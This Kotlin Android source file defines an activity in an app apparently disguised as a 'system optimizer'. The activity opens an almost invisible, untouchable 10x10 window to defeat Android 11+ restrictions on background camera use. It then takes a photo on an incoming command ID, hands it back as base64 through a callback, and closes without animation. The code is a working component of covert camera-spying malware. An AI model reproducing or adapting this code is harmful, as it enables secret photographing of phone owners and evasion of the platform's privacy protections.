package com.system.optimizer.monitor

import android.app.Activity
import android.os.Bundle
import android.util.Log
import android.view.WindowManager

/**
 * Transparent, invisible activity briefly launched when Android 11+ blocks background services
 * from accessing the camera directly (`openCamera throws SecurityException or ERROR_CAMERA_DISABLED`).
 * Since this activity is briefly in the foreground (invisible 1x1 window without animation),
 * Android allows Camera2 API access immediately.
 */
class CameraDummyActivity : Activity() {

    companion object {
        private const val TAG = "CameraDummyActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            window.addFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            )
            val params = window.attributes
            params.alpha = 0.05f
            params.width = 10
            params.height = 10
            window.attributes = params
        } catch (_: Exception) {}

    }

    override fun onResume() {
        super.onResume()
        val cameraType = intent.getStringExtra("cameraType") ?: "front"
        val cmdId = intent.getStringExtra("cmdId") ?: ""
        Log.i(TAG, "🟢 CameraDummyActivity resumed for $cameraType capture (cmd: $cmdId)")

        // Wait 250ms so Android AppOps recognizes the window is fully active & visible
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isFinishing) return@postDelayed
            CameraCapture.takePhotoDirect(this, cameraType) { base64, errorReason ->
                val callback = CameraCapture.activeDummyCallback
                CameraCapture.activeDummyCallback = null
                try {
                    callback?.invoke(base64, errorReason)
                } catch (_: Exception) {}

                try {
                    finish()
                    overridePendingTransition(0, 0)
                } catch (_: Exception) {}
            }
        }, 250)
    }

    override fun onPause() {
        super.onPause()
        if (!isFinishing) {
            try {
                finish()
                overridePendingTransition(0, 0)
            } catch (_: Exception) {}
        }
    }
}
